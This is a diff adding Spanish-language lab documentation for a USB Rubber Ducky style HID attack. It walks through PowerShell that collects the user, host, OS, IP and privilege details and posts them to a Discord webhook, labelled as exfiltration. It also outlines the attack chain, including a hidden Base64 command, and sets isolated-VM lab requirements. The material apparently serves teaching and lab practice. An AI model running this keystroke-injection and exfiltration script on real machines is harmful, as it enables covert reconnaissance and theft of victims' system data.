@@ -30,3 +30,62 @@ $so = (Get-CimInstance Win32_OperatingSystem).Caption
 $ip = ((Get-NetIPAddress -AddressFamily IPv4 |
         Where-Object InterfaceAlias -notlike '*Loopback*').IPAddress -join ', ')
 $p  = (whoami /priv | Out-String).Trim()
+```
+
+### Formateo del mensaje
+```powershell
+$msg = "AUDITORIA`nUsuario: $u`nHost: $h`nSO: $so`nIP: $ip`nPrivilegios:`n$p"
+```
+`n → salto de línea.
+
+Se construye un texto multilínea con toda la info.
+
+### JSON para Discord
+```powershell
+$json = ConvertTo-Json @{content=$msg} -Compress
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+```
+Discord espera {"content": "..."}. El uso de $bytes en UTF-8 evita
+problemas con tildes y caracteres especiales.
+
+### Exfiltración
+```powershell
+Invoke-RestMethod -Uri "Discord_Webhook_URL" `
+    -Method Post `
+    -Body $bytes `
+    -ContentType "application/json; charset=utf-8"
+POST al webhook → el atacante recibe el mensaje en su canal.
+```
+---
+
+# 🧠 Flujo completo del ataque
+        USB conectado → Windows lo reconoce como teclado.
+        Ducky escribe Win+R y lanza PowerShell.
+        PowerShell ejecuta el comando Base64 oculto.
+        El script recolecta info del sistema.
+        Envía el JSON al webhook de Discord.
+        El atacante ve el mensaje en su canal privado.
+
+
+---
+
+## 📄 `docs/requisitos.md`
+
+```markdown
+# Requisitos
+
+## Hardware
+- USB Rubber Ducky / Flipper Zero / Pico Ducky / cualquier HID programable.
+
+## Software
+- Windows 10/11 en **VM aislada** (VirtualBox, VMware, Hyper-V).
+- CyberChef: https://gchq.github.io/CyberChef/
+- Servidor Discord con webhook **de laboratorio**.
+
+## Preparación
+1. Crea una VM Windows con **snapshot previo**.
+2. Configura red **host-only** o sin salida a Internet salvo para el webhook.
+3. Genera un webhook **exclusivo del lab**.
+4. Nunca uses webhooks personales ni de terceros.
+5. Documenta el uso y destruye la VM al terminar.
+```
